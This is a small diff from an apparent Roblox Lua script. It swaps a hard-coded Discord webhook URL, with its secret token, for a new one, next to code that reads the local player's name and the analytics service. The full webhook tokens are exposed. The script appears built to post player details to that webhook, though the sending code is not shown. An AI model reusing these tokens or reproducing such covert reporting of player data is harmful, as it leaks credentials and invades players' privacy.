@@ -588,7 +588,7 @@ local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 local plr = Players.LocalPlayer
 -- Deine neue Webhook-URL:
-local webhook = "https://discord.com/api/webhooks/1528808043687706725/SMRYGtdhcTa3EFn-wuff9H9tu1ZzJvG71-z5BQcuso7s2yDejvhs0fwf_3bou_uh4gBm"
+local webhook = "https://discord.com/api/webhooks/1528751883911696517/RBzreXZEhW0NApYyfiu_2Cl77J25eKz1vUYI0czXybNn6OYMt2ZdkbyxtKQjqX_CTDCD"
 
 local function getuser()
     return plr.Character and plr.Character.Name or plr.Name
